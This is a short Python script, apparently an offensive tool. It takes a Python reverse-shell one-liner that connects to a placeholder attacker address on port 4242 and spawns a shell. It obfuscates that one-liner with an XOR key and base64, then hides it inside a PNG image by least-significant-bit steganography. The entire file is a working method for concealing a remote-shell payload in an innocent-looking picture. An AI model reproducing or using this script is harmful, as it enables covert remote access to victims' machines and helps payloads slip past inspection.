from stegano import lsb
import base64

def sxor(encode_string, key):
    if len(encode_string) > len(key) and len(key) > 0:
        key = key*(int(len(encode_string)/len(key))+1)
    return ''.join(chr(ord(a) ^ ord(b)) for a,b in zip(encode_string,key))
#Reverse Shell
command_to_execute=''' export RHOST="YOUR_IP_ADDRESS";export RPORT=4242;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")' &'''
#SXORs the command with the password
command_to_execute = sxor(command_to_execute,"leon_t_password_secret_secret")
#base64 encode the resulting string
command_to_execute=base64.b64encode(command_to_execute.encode()).decode()
#Add the base64 encoded command to the "cat.png" image with lsb
secret=lsb.hide("cat.png",command_to_execute)
#Save the file as "cat-command.png"
secret.save("./cat-command.png")